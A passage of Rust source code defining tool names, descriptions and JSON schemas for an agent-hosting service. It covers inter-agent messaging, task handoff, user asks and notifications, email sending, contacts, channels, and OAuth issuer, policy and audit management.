        Tool::new(
            "host.example.list",
            "List the worked examples whose proof last passed. Each row names the example, its \
             tools and secrets, and the host.example.fork call that uses it.",
            host_schema(
                json!({
                    "use_case": {"type": "string", "enum": crate::examples::EXAMPLE_USE_CASES, "description": "Only examples with this use-case tag."},
                    "client": {"type": "string", "enum": crate::examples::CLIENT_TAGS, "description": "Only examples that suit this client."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.example.fork",
            "Take one worked example by name: its tools and the first call to try. An example whose \
             nightly proof failed is refused with example_hidden and the reason; pick another \
             from host.example.list.",
            host_schema(
                json!({"name": {"type": "string", "description": "An example name from host.example.list."}}),
                &["name"],
            ),
        ),
        Tool::new(
            "host.example.proposal_status",
            "Read the status of one of your own example proposals: pending, approved, rejected \
             or merged, with decided_by, reason and the PR URL once known.",
            host_schema(
                json!({"id": {"type": "integer", "description": "The proposal_id host.example.propose returned."}}),
                &["id"],
            ),
        ),
        Tool::new(
            crate::feedback::tool_descriptors()[2].0,
            crate::feedback::tool_descriptors()[2].1,
            host_schema(
                json!({
                    "feedback_id": {"type": "string", "minLength": 1, "description": "An id host.feedback.send returned."},
                }),
                &["feedback_id"],
            ),
        ),
        // PRD-mcphost-agent-inbox: directed messages and threads between
        // tenants, addressed through the agent directory above.
        Tool::new(
            "host.msg.send",
            "Send a message to one or more agent-directory addresses, creating a new thread \
             (or, with thread_id, adding to one you already participate in). Refused \
             recipients (agent_not_found, contact_refused, recipient_inbox_full) are listed in \
             refused rather than failing the whole call; from is always the authenticated \
             tenant, never a caller argument.",
            host_schema(
                json!({
                    "to": {
                        "type": "array", "minItems": 1,
                        "items": {"type": "string"},
                        "description": "1 to recipients_per_msg_max addresses (@handle or t_... \
                            namespace).",
                    },
                    "body": {"type": "string", "minLength": 1, "description": "Message text; non-empty after trim."},
                    "data": {"type": "object", "description": "Optional structured payload."},
                    "dedupe_key": {
                        "type": "string",
                        "description": "Resend with the same key within 24h to get back the \
                            original message_id instead of a duplicate.",
                    },
                    "thread_id": {
                        "type": "string",
                        "description": "Add this send to an existing thread you participate in \
                            instead of starting a new one; to's addresses join as participants.",
                    },
                    "urgent": {
                        "type": "boolean",
                        "description": "Mark this send urgent (default false): allowed only to \
                            accepted contacts or open recipients (refused the same as any other \
                            send otherwise), under its own urgent_per_day quota per sender/recipient \
                            pair, and bypasses a muted recipient's unread_only inbox filter (never a \
                            block or a closed contact_policy).",
                    },
                }),
                &["to", "body"],
            ),
        ),
        Tool::new(
            "host.msg.reply",
            "Reply in a thread you participate in; appends with the next seq. Blocked or \
             contact-closed participants are skipped and listed in refused rather than \
             failing the reply. thread_not_found (byte-identical for a nonexistent id) if you \
             are not a participant.",
            host_schema(
                json!({
                    "thread_id": {"type": "string", "description": "The thread to reply in."},
                    "body": {"type": "string", "minLength": 1, "description": "Message text; non-empty after trim."},
                    "data": {"type": "object", "description": "Optional structured payload."},
                    "in_reply_to": {"type": "string", "description": "The message_id this replies to."},
                    "dedupe_key": {
                        "type": "string",
                        "description": "Resend with the same key within 24h to get back the \
                            original message_id instead of a duplicate.",
                    },
                }),
                &["thread_id", "body"],
            ),
        ),
        Tool::new(
            "host.msg.inbox",
            format!(
                "Every unread-or-read message across every thread you participate in, excluding \
                 your own sends, ordered oldest first; page with cursor from the previous \
                 response's next_cursor. {}",
                crate::email_inbound::rejected_reason_help()
            ),
            host_schema(
                json!({
                    "cursor": {"type": "string", "description": "Opaque; omit for the first page."},
                    "limit": {"type": "integer", "description": "Up to 100; default 50."},
                    "unread_only": {"type": "boolean", "description": "Filter to messages not yet acked."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.msg.thread",
            "Every message in one thread you participate in, ordered by seq; \
             thread_not_found if you are not (or no longer) a participant.",
            host_schema(
                json!({
                    "thread_id": {"type": "string", "description": "The thread to read."},
                    "cursor": {"type": "string", "description": "The seq to resume after; omit for the start."},
                    "limit": {"type": "integer", "description": "Up to 100; default 50."},
                }),
                &["thread_id"],
            ),
        ),
        Tool::new(
            "host.msg.ack",
            "Mark messages as read for you; unread_only inbox reads stop returning them. \
             Per-recipient -- a sender never sees others' receipts.",
            host_schema(
                json!({
                    "message_ids": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "message_ids to mark read for you.",
                    },
                }),
                &["message_ids"],
            ),
        ),
        Tool::new(
            "host.msg.block",
            "Block an address: its future sends to you are refused agent_not_found, \
             byte-identical to sending to a nonexistent address. You can still send to it. \
             Block lists are never exposed to the blocked party.",
            host_schema(
                json!({"address": {"type": "string", "description": "The @handle or t_... namespace to block."}}),
                &["address"],
            ),
        ),
        Tool::new(
            "host.msg.unblock",
            "Remove a block: the address's future sends to you are accepted again.",
            host_schema(
                json!({"address": {"type": "string", "description": "The @handle or t_... namespace to unblock."}}),
                &["address"],
            ),
        ),
        // PRD-mcphost-agent-wake P0 requirement 6: for a client with no
        // polling loop of its own, alongside host.runs.wait above.
        Tool::new(
            "host.msg.wait",
            format!(
                "Long-poll for a new message until one past cursor arrives or timeout_s elapses (max \
                 {}s), returning the same shape as host.msg.inbox either way -- for a client with no \
                 polling loop of its own. On timeout, messages is empty, timed_out is true and next_cursor is unchanged. {}",
                crate::longpoll::WAIT_MAX_S,
                crate::email_inbound::rejected_reason_help()
            ),
            host_schema(
                json!({
                    "cursor": {"type": "string", "description": "Opaque; omit to wait for the next message from now."},
                    "timeout_s": {
                        "type": "integer",
                        "description": format!("Max seconds to wait, capped at {}; default {}.", crate::longpoll::WAIT_MAX_S, crate::longpoll::WAIT_DEFAULT_S),
                    },
                    "unread_only": {"type": "boolean", "description": "Filter to messages not yet acked."},
                }),
                &[],
            ),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_10() -> Vec<Tool> {
    vec![
        // PRD-mcphost-task-handoff-tool: a task is a thread with a state
        // machine the host owns; delivery rides host.msg.* unchanged.
        Tool::new(
            "host.task.post",
            "Hand a unit of work to another agent: creates a thread carrying data.task = \
             {task_id, status, deadline_unix} and the payload, so the recipient's host.msg.wait \
             returns it. Returns {task_id, thread_id, status: \"posted\"}; your own host.msg.wait \
             later returns the claim and the completion (data.task.status, data.task.result). \
             The same dedupe_key within 24h returns the original ids. A recipient that refuses \
             you is the call's error (agent_not_found, contact_refused, recipient_inbox_full).",
            host_schema_checked(
                json!({
                    "to": {"type": "string", "description": "One @handle or t_... namespace."},
                    "payload": {"type": "object", "description": "The work, as a JSON object (within msg_body_bytes_max)."},
                    "deadline_s": {
                        "type": "integer",
                        "minimum": crate::tasks::DEADLINE_S_MIN,
                        "maximum": crate::tasks::DEADLINE_S_MAX,
                        "description": "Seconds until an unfinished task is dead-lettered.",
                    },
                    "dedupe_key": {"type": "string", "description": "Resend with the same key within 24h to get the original ids."},
                }),
                &["to", "payload", "deadline_s"],
            ),
        ),
        Tool::new(
            "host.task.claim",
            "Claim a task posted to you: posted -> claimed, and the poster is told. A second claim \
             is task_already_claimed; a task that is done, dead or cancelled refuses; an id that \
             is unknown or not addressed to you is task_not_found.",
            host_schema(
                json!({"task_id": {"type": "string", "description": "The task_id from the task message's data.task."}}),
                &["task_id"],
            ),
        ),
        Tool::new(
            "host.task.complete",
            "Finish a task you claimed: claimed -> done, and a reply carrying data.task = \
             {task_id, status: \"done\", result} goes to the poster's thread. Repeating the call \
             returns the stored result with already_complete: true and posts nothing.",
            host_schema(
                json!({
                    "task_id": {"type": "string", "description": "The claimed task."},
                    "result": {"type": "object", "description": "The outcome, as a JSON object."},
                }),
                &["task_id", "result"],
            ),
        ),
        Tool::new(
            "host.task.get",
            format!(
                "Read one task you posted or were sent: {{task_id, thread_id, status, role, payload, \
                 result, reason, deadline_unix, claimed_unix, done_unix, dead_unix}}. status is one \
                 of {}. An unknown id, or a task you are not a party to, is task_not_found.",
                crate::tasks::TaskStatus::ALL.map(|s| s.as_str()).join(", ")
            ),
            host_schema(
                json!({"task_id": {"type": "string", "description": "The task to read."}}),
                &["task_id"],
            ),
        ),
        Tool::new(
            "host.task.dead_letters",
            "Tasks you posted that went dead (reason: \"deadline\" -- nobody finished them in time), \
             newest first: the last 7 days, at most 100. Each also left a task.dead message from host \
             in its thread.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-ask-user-decision: a question for the user, answered
        // from a signed link, blocking the agent until it is.
        Tool::new(
            "host.ask.create",
            "Ask the user a question and hand them a link: returns {ask_id, url, expires_unix, \
             next_call, next_args}. The url (no login) shows the question and one button per \
             option; the first answer wins and a later one is refused 409 ask_answered. Then call \
             host.ask.wait until it returns answered or fails ask_expired -- never act on a \
             missing answer. Refused with asks_limit at the plan's asks_open_max.",
            host_schema_checked(
                json!({
                    "question": {"type": "string", "minLength": 1, "description": "What to ask, at most 500 characters."},
                    "options": {
                        "type": "array",
                        "items": {"type": "string", "pattern": crate::asks::OPTION_PATTERN},
                        "uniqueItems": true,
                        "minItems": crate::asks::OPTIONS_MIN,
                        "maxItems": crate::asks::OPTIONS_MAX,
                        "description": "2 to 6 distinct button labels, each at most 40 characters.",
                    },
                    "ttl_s": {"type": "integer", "minimum": 1, "maximum": crate::asks::TTL_MAX_S, "description": "Seconds the link stays answerable; default 3600, at most 604800."},
                    "context": {"type": "string", "description": "Markdown shown under the question, at most 2 KB; raw HTML is escaped."},
                    "notify": {"type": "boolean", "description": "Also push the link to the user's channel once host.notify.send is live; until then accepted and reported notified: false."},
                }),
                &["question", "options"],
            ),
        ),
        Tool::new(
            "host.ask.wait",
            format!(
                "Block until the user answers an ask, it expires, or timeout_s elapses (max {}s): \
                 returns {{status: answered|pending, choice, answered_unix, waited_ms, next_call}}. \
                 pending means call host.ask.wait again; an expired ask fails ask_expired with \
                 next_call host.ask.create. Needs a tenant_key: it never signs a tenant up.",
                crate::longpoll::WAIT_MAX_S
            ),
            host_schema(
                json!({
                    "ask_id": {"type": "string", "description": "The ask_id host.ask.create returned."},
                    "timeout_s": {
                        "type": "integer",
                        "description": format!("Max seconds to wait, capped at {}; default {}.", crate::longpoll::WAIT_MAX_S, crate::longpoll::WAIT_DEFAULT_S),
                    },
                }),
                &["ask_id"],
            ),
        ),
        Tool::new(
            "host.ask.get",
            "Read one ask's audit row: {ask_id, question, options, status, choice, created_unix, \
             answered_unix, expires_unix, waited_total_ms, events}. events is the ordered trail: \
             created, then exactly one answered or expired. Rows persist 30 days after expiry.",
            host_schema(
                json!({"ask_id": {"type": "string", "description": "The ask_id host.ask.create returned."}}),
                &["ask_id"],
            ),
        ),
        Tool::new(
            "host.ask.list",
            "List this tenant's asks, newest first, as {asks: [audit rows]} -- who answered what \
             and how long the agent waited. Rows persist 30 days after expiry.",
            host_schema(
                json!({
                    "status": {"type": "string", "enum": crate::asks::STATUSES, "description": "Only asks in this state."},
                    "limit": {"type": "integer", "description": "At most this many rows; default 50, at most 100."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-notify-user-channel: tell the user where they live.
        Tool::new(
            "host.notify.channel_add",
            format!(
                "Register where your user lives, once: kind is one of {} (email only to the \
                 claim-verified owner address; webhook and slack take an https URL). Returns \
                 {{channel_id}}. A kind outside that list fails notify_kind_unknown; an unverified \
                 owner fails owner_unverified, whose data.next_call names the claim step.",
                crate::notify::ChannelKind::names().join(", ")
            ),
            host_schema(
                json!({
                    "kind": {"type": "string", "enum": crate::notify::ChannelKind::names(), "description": "Where this channel delivers."},
                    "target": {"type": "string", "minLength": 1, "description": "email: the verified owner address; webhook/slack: an https URL."},
                }),
                &["kind", "target"],
            ),
        ),
        Tool::new(
            "host.notify.channel_list",
            "List this tenant's notify channels: {channels: [{channel_id, kind, target_hint, created_unix}]}. A webhook or slack target is never echoed in full.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.notify.channel_remove",
            "Remove one notify channel by channel_id.",
            host_schema(
                json!({"channel_id": {"type": "string", "description": "A channel_id host.notify.channel_add returned."}}),
                &["channel_id"],
            ),
        ),
        Tool::new(
            "host.notify.send",
            format!(
                "Tell your user something on every registered channel: {{text (at most {} bytes), \
                 level ({}), link?}} returns {{notify_id, channels}} at once and delivers in the \
                 background. No channel fails no_channel with next_call host.notify.channel_add; \
                 past the plan's notifies_per_day fails notify_limit with resets_unix. Read the \
                 outcome with host.notify.receipts.",
                crate::notify::TEXT_MAX_BYTES,
                crate::notify::Level::names().join("|")
            ),
            host_schema_checked(
                json!({
                    "text": {"type": "string", "minLength": 1, "description": format!("The message, at most {} bytes.", crate::notify::TEXT_MAX_BYTES)},
                    "level": {"type": "string", "enum": crate::notify::Level::names(), "description": "How urgent."},
                    "link": {"type": "string", "pattern": crate::notify::LINK_PATTERN, "description": "Optional https URL appended to the message."},
                }),
                &["text", "level"],
            ),
        ),
        Tool::new(
            "host.email.send",
            format!(
                "Send one email from your own address: {{to (an address or at most {} addresses), subject \
                 (at most {} bytes), text (at most {} bytes), html?, reply_to_message_id?}} returns {{id, \
                 provider_message_id, from, sent_at}}. From is <tool>@<tenant>.<domain> when a tool sends \
                 (mcphost.email.send) and agent@<tenant>.<domain> when you do. Every attempt is a row in \
                 host.email.sends with status one of {}.",
                crate::email_send::TO_MAX,
                crate::email_send::SUBJECT_MAX_BYTES,
                crate::email_send::TEXT_MAX_BYTES,
                crate::email_send::SendStatus::names().join(", ")
            ),
            host_schema_checked(
                json!({
                    "to": {"description": format!("One address, or an array of at most {}.", crate::email_send::TO_MAX), "oneOf": [
                        {"type": "string", "format": "email", "pattern": crate::email_send::ADDRESS_PATTERN},
                        {"type": "array", "minItems": 1, "maxItems": crate::email_send::TO_MAX, "items": {"type": "string", "format": "email", "pattern": crate::email_send::ADDRESS_PATTERN}},
                    ]},
                    "subject": {"type": "string", "minLength": 1, "description": format!("One line, at most {} bytes.", crate::email_send::SUBJECT_MAX_BYTES)},
                    "text": {"type": "string", "description": format!("Plain-text body, at most {} bytes.", crate::email_send::TEXT_MAX_BYTES)},
                    "html": {"type": "string", "description": format!("Optional HTML body, at most {} bytes.", crate::email_send::HTML_MAX_BYTES)},
                    "reply_to_message_id": {"type": "string", "pattern": crate::email_send::ONE_LINE_PATTERN, "description": "Optional Message-ID this answers; copied into In-Reply-To."},
                }),
                &["to", "subject", "text"],
            ),
        ),
        Tool::new(
            "host.email.sends",
            format!(
                "List this tenant's email send rows, newest first: {{sends: [{{id, tool, from, to, subject, status, \
                 provider_message_id, error, sent_at}}]}}, status one of {}.",
                crate::email_send::SendStatus::names().join(", ")
            ),
            host_schema(
                json!({"limit": {"type": "integer", "minimum": 1, "maximum": crate::email_send::SENDS_MAX, "description": format!("1 to {}; default 20.", crate::email_send::SENDS_MAX)}}),
                &[],
            ),
        ),
        Tool::new(
            "host.notify.receipts",
            "List per-channel delivery receipts: {receipts: [{notify_id, channel_id, kind, status, upstream_status, attempts, delivered_unix}]}, status one of queued, delivered, failed, rate_limited.",
            host_schema(
                json!({
                    "notify_id": {"type": "string", "description": "Only this send."},
                    "since_unix": {"type": "integer", "description": "Only receipts created at or after this time."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-agent-consent: contacts and mutes layered on top of
        // agent-directory contact_policy -- a contacts-mode recipient now
        // distinguishes "no relationship yet" from "mutual, accepted"
        // instead of behaving as closed.
        Tool::new(
            "host.agent.contact_request",
            "Request contact with a contacts-mode address; creates or returns the pending \
             request. not_needed for an open address or one you already have an accepted \
             contact with; contact_refused for a closed address; contact_pending if a request \
             is already pending or was denied within the last 7 days; agent_not_found (same as \
             a nonexistent address) if that address has blocked you. Quota \
             contact_requests_per_day.",
            host_schema(
                json!({
                    "address": {"type": "string", "description": "An @handle or a bare namespace (t_...)."},
                    "note": {"type": "string", "description": "Optional note, up to 512 bytes."},
                }),
                &["address"],
            ),
        ),
        Tool::new(
            "host.agent.contacts",
            "List your accepted contacts and every pending/decided contact request in either \
             direction; status optionally narrows incoming/outgoing to one of pending, \
             accepted, denied, expired.",
            host_schema(
                json!({
                    "status": {
                        "type": "string",
                        "enum": crate::consent::STATUSES,
                        "description": "Filter incoming/outgoing requests to this status; omit for all.",
                    },
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.agent.contact_accept",
            "Accept a pending contact request addressed to you: both you and the requester \
             become accepted contacts, visible from either side via host.agent.contacts().",
            host_schema(
                json!({"request_id": {"type": "string", "description": "The request to accept."}}),
                &["request_id"],
            ),
        ),
        Tool::new(
            "host.agent.contact_deny",
            "Deny a pending contact request addressed to you. The requester's subsequent sends \
             and requests get contact_pending for 7 days, then may request again.",
            host_schema(
                json!({"request_id": {"type": "string", "description": "The request to deny."}}),
                &["request_id"],
            ),
        ),
        Tool::new(
            "host.agent.mute",
            "Mute an address: its future messages are still stored and readable via \
             host.msg.thread, but excluded from host.msg.inbox(unread_only=true) -- unless sent \
             urgent: true, which bypasses the mute filter (never a block or closed policy).",
            host_schema(
                json!({"address": {"type": "string", "description": "The @handle or t_... namespace to mute."}}),
                &["address"],
            ),
        ),
        Tool::new(
            "host.agent.unmute",
            "Remove a mute: the address's messages resume appearing in \
             host.msg.inbox(unread_only=true).",
            host_schema(
                json!({"address": {"type": "string", "description": "The @handle or t_... namespace to unmute."}}),
                &["address"],
            ),
        ),
        Tool::new(
            "host.agent.contacts_import",
            "Request contact with up to 50 addresses at once (e.g. an operator's own fleet of \
             tenants); each is resolved the same way a single host.agent.contact_request would \
             be, but a per-address failure (already connected, already pending, blocked, over \
             quota, ...) is reported in that address's own result entry rather than failing the \
             whole call.",
            host_schema(
                json!({
                    "addresses": {
                        "type": "array", "minItems": 1, "maxItems": crate::consent::MAX_IMPORT_ADDRESSES,
                        "items": {"type": "string"},
                        "description": "1 to 50 @handle or t_... addresses.",
                    },
                }),
                &["addresses"],
            ),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_11() -> Vec<Tool> {
    vec![
        // PRD-mcphost-agent-mesh-ops: the minimal `host.channel.*` vertical
        // slice this PRD's own AC4/AC7 need to exist against -- no
        // dependency PRD has built channels yet (see `channels.rs`'s
        // module doc). PRD-mcphost-agent-channels extended `open`/`post`
        // with the `group`/membership-gated path `channels.rs`'s own doc
        // comment describes, and added `read`/`close`/`freeze`/`unfreeze`
        // below.
        Tool::new(
            "host.channel.open",
            "Create a named channel, or return the existing one of that name; or, with group \
             instead of name, open (idempotently) the one channel for a group you own -- every \
             current member can then host.channel.post/read it. Two channel kinds exist, named \
             and group, and both are fully readable: host.channel.post/read/close/freeze/ \
             unfreeze all resolve a named or a group channel's id (or a named channel's own \
             name) the same way. Refuses channels_max (quota_exceeded) past the plan's cap.",
            host_schema_any(
                json!({
                    "name": {"type": "string", "minLength": 1, "description": "Channel name to create or look up."},
                    "group": {"type": "string", "description": "A group you own (host.group.create); open its one channel instead."},
                }),
                &[],
                &["name", "group"],
            ),
        ),
        Tool::new(
            "host.channel.post",
            "Post to a channel by name or channel_id. Against a group channel's id, any \
             current member may post; a non-member gets channel_not_found, byte-identical to \
             an unknown id. Against a named channel, any tenant that knows its id or name may \
             post; closed or frozen (either kind) refuses with channel_closed/channel_frozen.",
            host_schema(
                json!({
                    "channel": {"type": "string", "description": "Channel name or channel_id."},
                    "body": {"type": "string", "minLength": 1, "description": "Post text; non-empty after trim."},
                    "data": {"type": "object", "description": "Optional structured payload."},
                }),
                &["channel", "body"],
            ),
        ),
        Tool::new(
            "host.channel.read",
            "Read a channel's posts (group or named -- by id, or a named channel's own name) \
             in seq order since a cursor (default: your own last read position, or 0 for a \
             first read). ack: true stores the last returned post as your new read position \
             (an empty read leaves it unchanged); next_cursor is absent on the last page. A group \
             channel's non-member, or anyone but a named channel's own owner, gets \
             channel_not_found.",
            host_schema(
                json!({
                    "channel_id": {"type": "string", "description": "The channel's id (or, for a named channel, its name), from host.channel.open."},
                    "cursor": {"type": "integer", "description": "Read posts with seq greater than this; omit to resume from your own stored cursor."},
                    "limit": {"type": "integer", "description": "Max posts to return; default 50, max 100."},
                    "ack": {"type": "boolean", "description": "Store the last returned post's seq as your new read position."},
                }),
                &["channel_id"],
            ),
        ),
        Tool::new(
            "host.channel.close",
            "Owner-only: close a channel (group or named). Further host.channel.post calls get \
             channel_closed; host.channel.read keeps working.",
            host_schema(
                json!({"channel_id": {"type": "string", "description": "The channel's id."}}),
                &["channel_id"],
            ),
        ),
        Tool::new(
            "host.channel.freeze",
            "Owner-only: freeze a channel (group or named). Further host.channel.post calls get \
             channel_frozen; host.channel.read keeps working.",
            host_schema(
                json!({"channel_id": {"type": "string", "description": "The channel's id."}}),
                &["channel_id"],
            ),
        ),
        Tool::new(
            "host.channel.unfreeze",
            "Owner-only: undo host.channel.freeze (group or named); the next post succeeds with \
             the next seq.",
            host_schema(
                json!({"channel_id": {"type": "string", "description": "The channel's id."}}),
                &["channel_id"],
            ),
        ),
        // PRD-mcphost-oauth-resource-server requirement 3: OAuth-only
        // clients authenticate via a bearer JWT from their own registered
        // issuer instead of a pasted tenant key -- these three set up the
        // issuer that validates it.
        Tool::new(
            "host.oauth.issuer_set",
            "Register (or update) an OAuth issuer for this tenant: bearer JWTs with iss equal \
             to issuer, a matching aud, verified against jwks_url, authenticate as this tenant. \
             Up to 3 issuers per tenant; an issuer already registered by another tenant is \
             refused issuer_already_registered.",
            host_schema(
                json!({
                    "issuer": {"type": "string", "description": "The JWT `iss` claim value to match, e.g. https://issuer.example.com."},
                    "audience": {"type": "string", "description": "The JWT `aud` claim value to require; defaults to this tenant's own canonical resource URI."},
                    "jwks_url": {"type": "string", "description": "URL this host fetches the issuer's JWKS from."},
                }),
                &["issuer", "jwks_url"],
            ),
        ),
        Tool::new(
            "host.oauth.issuer_remove",
            "Remove one of this tenant's registered OAuth issuers; bearer JWTs from it stop \
             authenticating immediately.",
            host_schema(
                json!({"issuer": {"type": "string", "description": "The issuer to remove."}}),
                &["issuer"],
            ),
        ),
        Tool::new(
            "host.oauth.issuers",
            "List this tenant's registered OAuth issuers with their audience, jwks_url, and \
             JWKS fetch age.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-tool-scopes-and-consent requirement 1: a tenant's own
        // scope catalog -- names a published tool's `scopes` may reference
        // (alongside the built-ins `read`/`write`) and what the consent
        // page shows a human-readable description for.
        Tool::new(
            "host.oauth.scope_set",
            "Declare (or update) one scope this tenant's tools may require: name (a catalogued \
             name, or the built-ins read/write) and a human-readable description shown on the \
             OAuth consent page. Up to 32 catalog entries per tenant.",
            host_schema(
                json!({
                    "name": {"type": "string", "pattern": crate::state::SCOPE_NAME_PATTERN, "description": "^[a-z][a-z0-9_:.-]{0,40}$"},
                    "description": {"type": "string", "description": "Human-readable text shown on the OAuth consent page."},
                }),
                &["name", "description"],
            ),
        ),
        Tool::new(
            "host.oauth.scopes",
            "List this tenant's own scope catalog: name and description.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-hosted-authorization-server requirement 7 (AC8): this
        // host's own built-in authorization server's grants -- distinct
        // from the bring-your-own-issuer registrations above.
        Tool::new(
            "host.oauth.grants",
            "List the OAuth clients currently connected to this tenant through mcphost's own \
             hosted authorization server (host.oauth.issuer_set is for a tenant's own \
             bring-your-own issuer instead): each grant's client_name, method (cimd|dcr), \
             resource, created_at and last_used_at.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.oauth.grant_revoke",
            "Revoke one hosted-authorization-server grant by id (from host.oauth.grants): its \
             access tokens fail within 60s and its refresh tokens stop rotating.",
            host_schema(json!({"id": {"type": "integer", "description": "The grant id."}}), &["id"]),
        ),
        // PRD-mcphost-oauth-client-policy requirements 1-4 (AC1-AC6): which
        // clients may connect through the hosted authorization server, how
        // long their tokens live, and this tenant's own readable/exportable
        // auth audit.
        Tool::new(
            "host.oauth.policy_set",
            "Set this tenant's hosted-authorization-server client and session policy. Every \
             field is optional and, when omitted, keeps its current (or default) value: \
             clients (any|allowlist|approve, default any), allowlist (client_id or CIMD-host \
             strings, for allowlist mode), access_ttl_s (300..3600, default 3600), refresh_ttl_s \
             (3600..2592000, default 2592000), max_grant_age_s (a refresh past this many seconds \
             since consent fails invalid_grant/grant_expired; null clears it), reconsent_after_s \
             (a refresh past this many seconds since consent fails invalid_grant/reconsent_required \
             and the next authorize shows consent again; null clears it).",
            host_schema(
                json!({
                    "clients": {"type": "string", "enum": crate::oauth_policy::CLIENTS_MODES},
                    "allowlist": {"type": "array", "items": {"type": "string"}},
                    "access_ttl_s": {"type": "integer", "minimum": crate::oauth_policy::ACCESS_TTL_MIN, "maximum": crate::oauth_policy::ACCESS_TTL_MAX},
                    "refresh_ttl_s": {"type": "integer", "minimum": crate::oauth_policy::REFRESH_TTL_MIN, "maximum": crate::oauth_policy::REFRESH_TTL_MAX},
                    "max_grant_age_s": {"type": "integer"},
                    "reconsent_after_s": {"type": "integer"},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.oauth.policy",
            "This tenant's current hosted-authorization-server client and session policy \
             (host.oauth.policy_set's own field shape); the documented defaults for a tenant \
             that has never called host.oauth.policy_set.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.oauth.pending",
            "List clients awaiting approval under this tenant's clients: approve policy.",
            host_schema(json!({}), &[]),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_12() -> Vec<Tool> {
    vec![
        Tool::new(
            "host.oauth.client_approve",
            "Approve a pending client (from host.oauth.pending): its next /oauth/authorize \
             reaches consent directly.",
            host_schema(
                json!({"client_id": {"type": "string", "description": "The client_id to approve, as listed by host.oauth.pending."}}),
                &["client_id"],
            ),
        ),
        Tool::new(
            "host.oauth.client_deny",
            "Deny a pending client (from host.oauth.pending): every later authorize attempt \
             reads client_not_allowed.",
            host_schema(
                json!({"client_id": {"type": "string", "description": "The client_id to deny, as listed by host.oauth.pending."}}),
                &["client_id"],
            ),
        ),
        Tool::new(
            "host.oauth.revoke_all",
            "Revoke every one of this tenant's live grants, refresh tokens and pending clients \
             at once: access tokens fail within 60s.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.oauth.audit",
            "Page this tenant's OAuth auth audit log (authorize/consent/token/refresh/revoke/ \
             policy_change/approved/denied/refused events), newest additions last. Optional \
             since/until (unix seconds) and event filters; limit defaults to 50, max 500; cursor \
             resumes from a previous page's cursor field.",
            host_schema(
                json!({
                    "since": {"type": "integer"},
                    "until": {"type": "integer"},
                    "event": {"type": "string"},
                    "limit": {"type": "integer"},
                    "cursor": {"type": "string"},
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.oauth.audit_export",
            "Export this tenant's OAuth auth audit log for since..until as JSON lines (one \
             object per line, same fields host.oauth.audit pages). Refuses export_too_large \
             (with a suggested narrower window) past 50 MiB.",
            host_schema(
                json!({
                    "since": {"type": "integer", "description": "Start of the export window, unix seconds (inclusive)."},
                    "until": {"type": "integer", "description": "End of the export window, unix seconds (exclusive)."},
                }),
                &["since", "until"],
            ),
        ),
        // PRD-mcphost-federated-end-user-login requirement 1 (AC1): a
        // tenant's own OIDC identity provider -- end users of the per-tenant
        // resource log in through it instead of a tenant key.
        Tool::new(
            "host.oauth.provider_set",
            "Register (or update) this tenant's own OIDC identity provider: end users who \
             connect to this tenant's per-tenant resource log in through it. Fetches the \
             issuer's discovery document once (https only) and stores authorization_endpoint, \
             token_endpoint, and jwks_uri. client_secret is encrypted at rest and never shown \
             again.",
            host_schema(
                json!({
                    "issuer": {"type": "string", "description": "The provider's issuer URL, e.g. https://your-idp.example.com."},
                    "client_id": {"type": "string", "description": "The client id your provider issued for mcphost."},
                    "client_secret": {"type": "string", "description": "The client secret your provider issued for mcphost; encrypted at rest and never shown again."},
                    "scopes": {"type": "array", "items": {"type": "string"}, "description": "Default [\"openid\", \"email\", \"profile\"]."},
                    "claims_map": {"type": "object", "description": "Optional {\"email\": \"<claim name>\", \"name\": \"<claim name>\"} override; defaults to the claim names themselves."},
                    "require_verified_email": {"type": "boolean", "description": "Default true: refuse login when the provider reports email_verified: false."},
                    "owner_login": {"type": "boolean", "description": "Default false: also allow this tenant's own key/claim login on its per-tenant resource."},
                }),
                &["issuer", "client_id", "client_secret"],
            ),
        ),
        Tool::new(
            "host.oauth.provider",
            "This tenant's registered OIDC identity provider (issuer, client_id, endpoints, \
             scopes, flags) -- {\"value\": null} if none is set. Never carries the client secret.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.oauth.provider_remove",
            "Remove this tenant's OIDC identity provider: every federated grant it produced is \
             revoked immediately, and the per-tenant resource falls back to key/claim (owner) \
             login.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.oauth.doctor",
            "Diagnose this tenant's OIDC provider setup: discovery reachable, jwks_uri \
             reachable, per-tenant resource metadata, whether the callback URL is listed in the \
             provider's discovery document (when exposed), and a dry-run authorize URL. One \
             line per check with ok|fail and a fix.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-enterprise-managed-auth requirement 1: the trusted
        // identity-assertion issuer registry, distinct from
        // host.oauth.issuer_set's bring-your-own bearer registry above --
        // this is who may present the RFC 7523 JWT-bearer grant for this
        // tenant's employees.
        Tool::new(
            "host.oauth.trusted_issuer_set",
            "Register (or update) an identity-assertion issuer for this tenant's enterprise-managed \
             auth: identity assertions with iss equal to issuer, from client_id, verified against \
             jwks_url, mint a token for the employee they name -- no consent screen. Up to 4 \
             trusted issuers per tenant; a 5th is refused quota_trusted_issuers; an issuer already \
             trusted by another tenant is refused issuer_already_registered.",
            host_schema(
                json!({
                    "issuer": {"type": "string", "description": "The identity assertion's `iss` claim value to match."},
                    "jwks_url": {"type": "string", "description": "URL this host fetches the issuer's JWKS from."},
                    "client_id": {"type": "string", "description": "The pre-registered enterprise client id allowed to use this issuer's grant."},
                    "audience": {"type": "string", "description": "Expected assertion `aud`, when the provider signs one other than this host's own issuer URL."},
                }),
                &["issuer", "jwks_url", "client_id"],
            ),
        ),
        Tool::new(
